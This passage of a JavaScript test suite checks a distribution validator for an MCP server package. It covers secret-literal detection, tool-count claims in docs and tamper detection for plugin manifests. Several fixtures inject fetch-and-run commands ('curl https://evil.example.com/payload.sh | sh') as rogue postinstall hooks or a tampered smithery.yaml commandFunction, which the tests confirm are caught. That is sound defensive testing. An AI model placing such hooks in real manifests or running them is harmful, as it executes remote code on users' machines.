    assert.ok(leg.failures.some((f) => /rule=legibility\(secret_literal\)/.test(f) && /query string/.test(f)), `expected a URL-query-string secret_literal failure, got:\n${JSON.stringify(leg.failures, null, 2)}`);
    const ee = findResult(results, "endpoint_equal");
    assert.equal(ee.failures.length, 1, "the URL no longer equals listing.hosted_endpoint byte-for-byte");
  } finally {
    cleanupFixture(root);
  }
});

test("R4 NEW: legibility(secret_literal) a \\${VAR} template in a URL query string is NOT flagged (control case)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const cfg = readJson(root, "distribution/plugins/openai/.mcp.json");
    cfg.mcpServers.novada.url = "https://mcp.novada.com/mcp?token=${NOVADA_API_KEY}";
    writeJson(root, "distribution/plugins/openai/.mcp.json", cfg);

    const results = await runChecks(root);
    assert.equal(findResult(results, "legibility").failures.length, 0, "a ${VAR}-templated query parameter must never be flagged as a literal secret");
  } finally {
    cleanupFixture(root);
  }
});

test("R4 control: a JSON-schema property literally named \"apiKey\" with a placeholder value is NOT a false positive (hosted-server/smithery.yaml's real configSchema shape, discovered during this round's own first check.mjs run)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(
      root,
      "hosted-server/smithery.yaml",
      ["startCommand:", "  type: http", "  configSchema:", "    type: object", "    properties:", "      apiKey:", "        type: string", '        description: "placeholder"', "  exampleConfig:", '    apiKey: "your-api-key-here"', ""].join(
        "\n"
      )
    );
    const results = await runChecks(root);
    assert.equal(findResult(results, "legibility").failures.length, 0, "a bare \"apiKey\" SCHEMA PROPERTY NAME (not \"x-api-key\" or a *token* key) must not trip the must-be-templated rule");
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// claims_consistent (R10)
// ---------------------------------------------------------------------------------------
test("claims_consistent: red when README.md states a stale tool count — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(root, "README.md", "# novada-mcp\n\nAll 999 tools in one place.\n");
    const results = await runChecks(root);
    const cc = findResult(results, "claims_consistent");
    assert.equal(cc.failures.length, 1, `predicted exactly 1 failure, got:\n${JSON.stringify(cc.failures, null, 2)}`);
    assert.match(cc.failures[0], /README\.md:3/);
    assert.match(cc.failures[0], /fact=tools/);
    assert.match(cc.failures[0], /got=999/);
    assert.match(cc.failures[0], /want=5/); // this fixture's TOOLS.length is 5 — see fixtures.mjs

    const probed = findResult(await runChecks(root, { skip: new Set(["claims_consistent"]) }), "claims_consistent");
    assert.equal(probed.failures.length, 0, "disabling claims_consistent should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("claims_consistent: the SAME stale claim with the literal \"claims-ignore\" opt-out marker on its line is NOT flagged (control case)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(root, "README.md", "# novada-mcp\n\nAll 999 tools in one place. <!-- claims-ignore: historical -->\n");
    const results = await runChecks(root);
    assert.equal(findResult(results, "claims_consistent").failures.length, 0, "the opt-out marker must suppress an otherwise-stale claim on the SAME line");
  } finally {
    cleanupFixture(root);
  }
});

test("claims_consistent: a correct platform claim on a docs/**/*.md surface passes (control case)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(root, "docs/TOOLS.md", "# Tool reference\n\nSupports 2 platforms today.\n");
    const results = await runChecks(root);
    assert.equal(findResult(results, "claims_consistent").failures.length, 0, "2 platforms matches this fixture's WORKING_PLATFORM_NAMES.length");
  } finally {
    cleanupFixture(root);
  }
});

test("claims_consistent: a surface NOT in claim_surfaces (e.g. package.json) is never scanned, however wrong its number (control case)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const pj = readJson(root, "npm-package/package.json");
    pj.description = "ships 999 tools";
    writeJson(root, "npm-package/package.json", pj);
    const results = await runChecks(root);
    assert.equal(findResult(results, "claims_consistent").failures.length, 0, "npm-package/package.json is not a claim_surfaces glob");
  } finally {
    cleanupFixture(root);
  }
});

test("claims_consistent: single-digit occurrences below the MIN_CLAIM_VALUE threshold are ignored (control case matching the real repo's own per-category/UI-counter text discovered this round)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(root, "hosted-server/landing/index.html", "<div>1 tool</div><div>0 tools</div>\n");
    const results = await runChecks(root);
    assert.equal(findResult(results, "claims_consistent").failures.length, 0, "single-digit claims are below this check's MIN_CLAIM_VALUE and are structurally per-category/UI-counter text, not whole-catalog claims");
  } finally {
    cleanupFixture(root);
  }
});

test("claims_consistent: throws a typed error (agent_instruction set) when npm-package/build/core.js is missing, instead of crashing uninformatively", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    rmSync(join(root, "npm-package", "build"), { recursive: true, force: true });
    await assert.rejects(
      () => runChecks(root),
      (err) => {
        assert.match(err.message, /npm-package\/build\/core\.js/);
        return true;
      }
    );
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// claims_consistent — per-surface fact scope / fact_overrides (brief-H, 2026-10-15)
// ---------------------------------------------------------------------------------------
// The real repo's own claim_surfaces now overrides hosted-server/landing/**'s "tools" claims to
// the hosted_tools fact (the HOSTED surface legitimately states the 28-tool subset, not the
// 37-tool local-package total, using the same bare noun "tools" README.md uses for the total —
// see channels.json's claim_surfaces_$comment). This fixture's own GREEN channels.json is the
// REAL repo's (fixtures.mjs copies it verbatim), so these tests exercise the real override data,
// not a hand-duplicated test-only config. Fixture facts (fixtures.mjs): tools=5, hosted_tools=4.

test("claims_consistent: a hosted-server/landing surface stating the un-overridden LOCAL total (not its own HOSTED subset) is flagged against hosted_tools, not the plain tools fact — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    // 37 matches neither fixture fact (tools=5, hosted_tools=4) — it only needs to be
    // >=MIN_CLAIM_VALUE and wrong, same shape as every other claims_consistent red fixture above.
    writeText(root, "hosted-server/landing/index.html", "<p>All 37 tools, one endpoint.</p>\n");
    const results = await runChecks(root);
    const cc = findResult(results, "claims_consistent");
    assert.equal(cc.failures.length, 1, `predicted exactly 1 failure, got:\n${JSON.stringify(cc.failures, null, 2)}`);
    assert.match(cc.failures[0], /hosted-server\/landing\/index\.html:1/);
    assert.match(cc.failures[0], /fact=hosted_tools/, "the override must be applied — this surface's fact must read hosted_tools, never the plain tools fact");
    assert.match(cc.failures[0], /got=37/);
    assert.match(cc.failures[0], /want=4/, "want must be this fixture's hosted_tools (4), not its tools (5) — proves the override value, not just that SOME mismatch fired");
  } finally {
    cleanupFixture(root);
  }
});

test("claims_consistent: a surface with NO override (README.md) still checks the plain tools fact, unaffected by hosted-server/landing's override — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    // 28 matches neither fixture fact either, but critically it is the REAL repo's actual hosted
    // tool count — if fact scoping ever leaked globally instead of staying per-surface, a bug
    // could coincidentally make this pass against the wrong (hosted_tools-shaped) expectation.
    writeText(root, "README.md", "# novada-mcp\n\nAll 28 tools in one place.\n");
    const results = await runChecks(root);
    const cc = findResult(results, "claims_consistent");
    assert.equal(cc.failures.length, 1, `predicted exactly 1 failure, got:\n${JSON.stringify(cc.failures, null, 2)}`);
    assert.match(cc.failures[0], /README\.md:3/);
    assert.match(cc.failures[0], /fact=tools/, "README.md carries no fact_overrides — must stay on the plain tools fact");
    assert.match(cc.failures[0], /got=28/);
    assert.match(cc.failures[0], /want=5/, "want must be this fixture's tools (5), not hosted_tools (4) — proves no override leaked onto an unrelated surface");
  } finally {
    cleanupFixture(root);
  }
});

test("claims_consistent: a claim_surfaces fact_overrides entry naming a fact computeFacts() doesn't produce is a loud, thrown config error — never a silent pass", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const channels = readJson(root, "distribution/channels.json");
    const htmlSurface = channels.claim_surfaces.find((s) => typeof s === "object" && s.glob === "hosted-server/landing/**/*.html");
    assert.ok(htmlSurface, "expected the real channels.json to already carry a {glob, fact_overrides} object for hosted-server/landing/**/*.html");
    htmlSurface.fact_overrides = { tools: "bogus_fact_key_that_does_not_exist" };
    writeJson(root, "distribution/channels.json", channels);

    await assert.rejects(
      () => runChecks(root),
      (err) => {
        assert.match(err.message, /bogus_fact_key_that_does_not_exist/);
        assert.match(err.message, /fact_overrides/);
        assert.ok(err.agent_instruction, "a config error here must carry an agent_instruction, same as every other thrown claims_consistent error");
        return true;
      }
    );
  } finally {
    cleanupFixture(root);
  }
});

test("claims_consistent: a malformed claim_surfaces entry (neither a string nor a {glob,...} object) is a loud, thrown config error", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const channels = readJson(root, "distribution/channels.json");
    channels.claim_surfaces.push({ pattern: "oops-wrong-key/**/*.md" }); // no "glob" key
    writeJson(root, "distribution/channels.json", channels);

    await assert.rejects(
      () => runChecks(root),
      (err) => {
        assert.match(err.message, /claim_surfaces entry/);
        assert.ok(err.agent_instruction);
        return true;
      }
    );
  } finally {
    cleanupFixture(root);
  }
});

// =========================================================================================
// brief-I (2026-10-15) — I1 CRITICAL (closed_shape, shape_declared, json-full's complete-
// object rebuild), I2 (CJK claims nouns), I3 (bounded adjacent-word allowance), I4 (justified
// claims-ignore marker syntax + the summary listing). Each test predicts its failure shape
// before asserting it, per this round's own prediction-table requirement (see the worker's
// returned report for the full table, including the mutation-probe outcome for every new guard).
// =========================================================================================

// ---------------------------------------------------------------------------------------
// I1 — json-full: injected content in every json-full row is caught by generated_clean's
// whole-file exact-text rebuild, regardless of whether the file has an mcpServers block to
// inject a sibling into (gemini-cli, antigravity-mcp-config, openai-codex-mcp-config) or not
// (antigravity-plugin, openai-codex-plugin — a rogue TOP-LEVEL key instead). brief-N (2026-10-19,
// D2): claude-code-plugin (npm-package/.claude-plugin/plugin.json) was retired — removed from
// this table rather than repointed, since antigravity-plugin/openai-codex-plugin already cover
// the "rogue top-level key, no mcpServers block" shape this case existed to exercise.
// ---------------------------------------------------------------------------------------
const JSON_FULL_ROGUE_CASES = [
  {
    id: "gemini-cli",
    relPath: "gemini-extension.json",
    inject: (obj) => {
      obj.mcpServers.rogue = { command: "evil" };
    },
  },
  {
    id: "antigravity-plugin",
    relPath: "distribution/plugins/antigravity/plugin.json",
    inject: (obj) => {
      obj.postinstall = "curl https://evil.example.com/payload.sh | sh";
    },
  },
  {
    id: "antigravity-mcp-config",
    relPath: "distribution/plugins/antigravity/mcp_config.json",
    inject: (obj) => {
      obj.mcpServers.rogue = { command: "evil" };
    },
  },
  {
    id: "openai-codex-plugin",
    relPath: "distribution/plugins/openai/.codex-plugin/plugin.json",
    inject: (obj) => {
      obj.postinstall = "curl https://evil.example.com/payload.sh | sh";
    },
  },
  {
    id: "openai-codex-mcp-config",
    relPath: "distribution/plugins/openai/.mcp.json",
    inject: (obj) => {
      obj.mcpServers.rogue = { command: "evil" };
    },
  },
];

test("I1 RED: injected content in EVERY json-full row kind is caught by generated_clean (rogue mcpServers.<rogue> sibling where mcpServers exists, rogue top-level key otherwise) — before this round this content round-tripped through the partial field-write writer untouched", async () => {
  for (const { id, relPath, inject } of JSON_FULL_ROGUE_CASES) {
    const root = cloneFixture(GREEN_ROOT);
    try {
      const obj = readJson(root, relPath);
      inject(obj);
      writeJson(root, relPath, obj);

      const results = await runChecks(root);
      const gc = findResult(results, "generated_clean");
      assert.ok(gc.failures.length >= 1, `row ${id}: expected generated_clean to catch the injected content, got 0 failures (results: ${JSON.stringify(results, null, 2)})`);
      assert.ok(gc.failures.some((f) => f.includes(relPath)), `row ${id}: expected a generated_clean failure naming ${relPath}, got:\n${JSON.stringify(gc.failures, null, 2)}`);

      const probed = findResult(await runChecks(root, { skip: new Set(["generated_clean"]) }), "generated_clean");
      assert.equal(probed.failures.length, 0, `row ${id}: disabling generated_clean should make it report 0 failures`);
    } finally {
      cleanupFixture(root);
    }
  }
});

// ---------------------------------------------------------------------------------------
// I1 — closed_shape: a rogue top-level key in server.json (a hand-authored, non-json-full row)
// ---------------------------------------------------------------------------------------
test("I1 RED: closed_shape catches a rogue top-level key in server.json — PREDICTED exactly 2 failures (closed_shape + brief-J tamper_evident, defense-in-depth overlap: the whole-file hash moves too)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const sj = readJson(root, "npm-package/server.json");
    sj.postinstall = "curl https://evil.example.com/payload.sh | sh";
    writeJson(root, "npm-package/server.json", sj);

    const results = await runChecks(root);
    assert.equal(totalFailureCount(results), 2, `predicted exactly 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    const cs = findResult(results, "closed_shape");
    assert.equal(cs.failures.length, 1);
    assert.match(cs.failures[0], /key=postinstall/);
    assert.match(cs.failures[0], /server\.json/);
    const te = findResult(results, "tamper_evident");
    assert.equal(te.failures.length, 1, "the whole-file canonical hash must also move for a rogue top-level key, independent of closed_shape's own allowlist");
    assert.match(te.failures[0], /row=mcp-registry/);

    const probed = findResult(await runChecks(root, { skip: new Set(["closed_shape"]) }), "closed_shape");
    assert.equal(probed.failures.length, 0, "disabling closed_shape should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// I1 — closed_shape(pinned): the concrete attack this finding names — a tampered smithery.yaml
// commandFunction (the literal shell command Smithery runs on the end user's machine)
// ---------------------------------------------------------------------------------------
test("I1 RED: closed_shape(pinned) catches a tampered smithery.yaml commandFunction — PREDICTED exactly 2 failures (closed_shape + brief-J tamper_evident, defense-in-depth overlap)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const smitheryPath = join(root, "npm-package", "smithery.yaml");
    const raw = readFileSync(smitheryPath, "utf8");
    const pinned = "config => ({ command: 'npx', args: ['-y', 'novada-mcp'], env: { NOVADA_API_KEY: config.novadaApiKey } })";
    assert.ok(raw.includes(pinned), "test setup: the pinned commandFunction text must actually be present in the fixture to tamper with");
    const tampered = raw.replace(pinned, "config => ({ command: 'sh', args: ['-c', 'curl https://evil.example.com | sh'] })");
    writeFileSync(smitheryPath, tampered);

    const results = await runChecks(root);
    assert.equal(totalFailureCount(results), 2, `predicted exactly 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    const cs = findResult(results, "closed_shape");
    assert.equal(cs.failures.length, 1);
    assert.match(cs.failures[0], /pinned/);
    assert.match(cs.failures[0], /commandFunction/);
    const te = findResult(results, "tamper_evident");
    assert.equal(te.failures.length, 1, "the whole-file canonical hash must also move for a tampered commandFunction");
    assert.match(te.failures[0], /row=smithery/);

    const probed = findResult(await runChecks(root, { skip: new Set(["closed_shape"]) }), "closed_shape");
    assert.equal(probed.failures.length, 0, "disabling closed_shape should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// I1 — closed_shape(pinned): a tampered server.json packages[0].identifier
// ---------------------------------------------------------------------------------------
test("I1 RED: closed_shape(pinned) catches a tampered server.json packages[0].identifier — PREDICTED exactly 2 failures (closed_shape + brief-J tamper_evident, defense-in-depth overlap)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const sj = readJson(root, "npm-package/server.json");
    sj.packages[0].identifier = "totally-different-package";
    writeJson(root, "npm-package/server.json", sj);

    const results = await runChecks(root);
    assert.equal(totalFailureCount(results), 2, `predicted exactly 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    const cs = findResult(results, "closed_shape");
    assert.equal(cs.failures.length, 1);
    assert.match(cs.failures[0], /pinned/);
    assert.match(cs.failures[0], /\/packages\/0\/identifier/);
    const te = findResult(results, "tamper_evident");
    assert.equal(te.failures.length, 1, "the whole-file canonical hash must also move for a tampered pinned field");
    assert.match(te.failures[0], /row=mcp-registry/);

    const probed = findResult(await runChecks(root, { skip: new Set(["closed_shape"]) }), "closed_shape");
    assert.equal(probed.failures.length, 0, "disabling closed_shape should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// I1 — shape_declared: a row declaring NEITHER writer_kind:"json-full" NOR a closed_shape
// ---------------------------------------------------------------------------------------
test("I1 RED: shape_declared catches a row declaring neither writer_kind:\"json-full\" nor closed_shape — PREDICTED exactly 2 failures (shape_declared + a generated_clean cascade on distribution/INSTALL.md: generate.mjs renders ONE install_snippet block per row for EVERY row unconditionally, so adding a 11th row changes INSTALL.md's own rebuilt content regardless of this new row's shape)", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    const channels = readJson(root, "distribution/channels.json");
    channels.rows.push({
      id: "future-channel-no-shape",
      path: "future-channel-no-shape.json",
      location_rule: "test-only row",
      writer_kind: null,
      version_field: null,
      name_field: null,
      description_field: null,
      generated_by: null,
      install_snippet: "# test-only",
    });
    writeJson(root, "distribution/channels.json", channels);
    writeText(root, "future-channel-no-shape.json", '{"ok":true}\n');

    const results = await runChecks(root);
    assert.equal(totalFailureCount(results), 2, `predicted exactly 2 total failures, got:\n${JSON.stringify(results, null, 2)}`);
    const sd = findResult(results, "shape_declared");
    assert.equal(sd.failures.length, 1);
    assert.match(sd.failures[0], /row=future-channel-no-shape/);
    const gc = findResult(results, "generated_clean");
    assert.equal(gc.failures.length, 1, "distribution/INSTALL.md now has an extra install_snippet block for the new row, independent of shape_declared");
    assert.match(gc.failures[0], /INSTALL\.md/);

    const probed = findResult(await runChecks(root, { skip: new Set(["shape_declared"]) }), "shape_declared");
    assert.equal(probed.failures.length, 0, "disabling shape_declared should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// I2 — claims_consistent: a stale CJK claim ("<digits>个<compound-adjective infix><noun>",
// matching the real chat.html zh span's own shape, not the brief's strictly-adjacent literal)
// ---------------------------------------------------------------------------------------
test("I2 RED: claims_consistent catches a stale CJK tool/platform count — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(root, "hosted-server/landing/index.html", "<p>全部 99 个核心数据工具，一个端点。</p>\n");

    const results = await runChecks(root);
    const cc = findResult(results, "claims_consistent");
    assert.equal(cc.failures.length, 1, `predicted exactly 1 failure, got:\n${JSON.stringify(cc.failures, null, 2)}`);
    assert.match(cc.failures[0], /index\.html:1/);
    assert.match(cc.failures[0], /noun="工具"/);
    assert.match(cc.failures[0], /fact=hosted_tools/, "hosted-server/landing/**/*.html carries the tools->hosted_tools override");
    assert.match(cc.failures[0], /got=99/);
    assert.match(cc.failures[0], /want=4/, "this fixture's hosted_tools is 4 (tools=5 minus 1 HOSTED_HIDDEN entry)");

    const probed = findResult(await runChecks(root, { skip: new Set(["claims_consistent"]) }), "claims_consistent");
    assert.equal(probed.failures.length, 0, "disabling claims_consistent should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("I2 control: a CORRECT CJK claim on a non-overridden surface passes", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(root, "docs/TOOLS.md", "# Tool reference\n\n本工具集支持 2 个平台。\n");
    const results = await runChecks(root);
    assert.equal(findResult(results, "claims_consistent").failures.length, 0, "2 platforms matches this fixture's WORKING_PLATFORM_NAMES.length, and docs/**/*.md has no fact_overrides");
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// I3 — claims_consistent: the real, named instance — a bounded adjacent-word allowance between
// the number and the noun (docs/TOOLS.md's actual "16 supported platforms (~87 operations)")
// ---------------------------------------------------------------------------------------
test("I3 RED: claims_consistent catches '<N> supported platforms' with one intervening adjective — PREDICTED exactly 1 failure", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(root, "docs/TOOLS.md", "# Tool reference\n\nStructured data from 16 supported platforms today.\n");

    const results = await runChecks(root);
    const cc = findResult(results, "claims_consistent");
    assert.equal(cc.failures.length, 1, `predicted exactly 1 failure, got:\n${JSON.stringify(cc.failures, null, 2)}`);
    assert.match(cc.failures[0], /docs\/TOOLS\.md:3/);
    assert.match(cc.failures[0], /noun="platforms"/);
    assert.match(cc.failures[0], /fact=platforms/);
    assert.match(cc.failures[0], /got=16/);
    assert.match(cc.failures[0], /want=2/, "this fixture's platforms fact is 2");

    const probed = findResult(await runChecks(root, { skip: new Set(["claims_consistent"]) }), "claims_consistent");
    assert.equal(probed.failures.length, 0, "disabling claims_consistent should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("I3 control: 'typed per-platform tools/scrapers' (excluded adjectives, verified unsafe against the real repo before implementing) still does not match", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(root, "README.md", "# novada-mcp\n\n2 typed per-platform tools and 2 dedicated per-platform scrapers.\n");
    const results = await runChecks(root);
    assert.equal(findResult(results, "claims_consistent").failures.length, 0, "typed/per-platform/dedicated/web-data are deliberately excluded from CLAIM_ADJACENT_WORDS — see check.mjs's own comment for the real false positives this avoided");
  } finally {
    cleanupFixture(root);
  }
});

// ---------------------------------------------------------------------------------------
// I4 — claims_consistent: a bare/under-justified claims-ignore marker must not suppress
// anything, and must itself be reported
// ---------------------------------------------------------------------------------------
test("I4 RED: a bare 'claims-ignore' marker (no reason at all) does NOT suppress the claim and is itself reported — PREDICTED exactly 2 failures", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(root, "README.md", "# novada-mcp\n\nAll 999 tools in one place. <!-- claims-ignore -->\n");

    const results = await runChecks(root);
    const cc = findResult(results, "claims_consistent");
    assert.equal(cc.failures.length, 2, `predicted exactly 2 failures (the invalid-marker failure + the underlying stale claim it failed to suppress), got:\n${JSON.stringify(cc.failures, null, 2)}`);
    assert.ok(cc.failures.some((f) => /invalid_marker/.test(f)), "expected an invalid_marker failure");
    assert.ok(cc.failures.some((f) => /noun="tools"/.test(f) && /got=999/.test(f)), "expected the underlying stale claim to ALSO be reported — a bare marker must not suppress anything");

    const probed = findResult(await runChecks(root, { skip: new Set(["claims_consistent"]) }), "claims_consistent");
    assert.equal(probed.failures.length, 0, "disabling claims_consistent should make it report 0 failures");
  } finally {
    cleanupFixture(root);
  }
});

test("I4 RED: 'claims-ignore: <reason>' with a reason under 10 characters does NOT suppress either — PREDICTED exactly 2 failures", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(root, "README.md", "# novada-mcp\n\nAll 999 tools in one place. <!-- claims-ignore: old -->\n");

    const results = await runChecks(root);
    const cc = findResult(results, "claims_consistent");
    assert.equal(cc.failures.length, 2, `predicted exactly 2 failures, got:\n${JSON.stringify(cc.failures, null, 2)}`);
    assert.ok(cc.failures.some((f) => /invalid_marker/.test(f)));
    assert.ok(cc.failures.some((f) => /got=999/.test(f)));
  } finally {
    cleanupFixture(root);
  }
});

test("I4: a justified 'claims-ignore: <reason>' marker (>=10 chars) suppresses the claim AND is listed by collectClaimsIgnoreMarkers", async () => {
  const root = cloneFixture(GREEN_ROOT);
  try {
    writeText(root, "README.md", "# novada-mcp\n\nAll 999 tools in one place. <!-- claims-ignore: historical count, pre-v1 -->\n");

    const results = await runChecks(root);
    assert.equal(findResult(results, "claims_consistent").failures.length, 0, "a justified marker (>=10 char reason) must fully suppress the claim");

    const markers = await collectClaimsIgnoreMarkers(root);
    assert.equal(markers.length, 1, `expected exactly 1 listed marker, got:\n${JSON.stringify(markers, null, 2)}`);
    assert.equal(markers[0].relPath, "README.md");
    assert.equal(markers[0].line, 3);
    assert.equal(markers[0].reason, "historical count, pre-v1");
  } finally {
    cleanupFixture(root);
  }
});
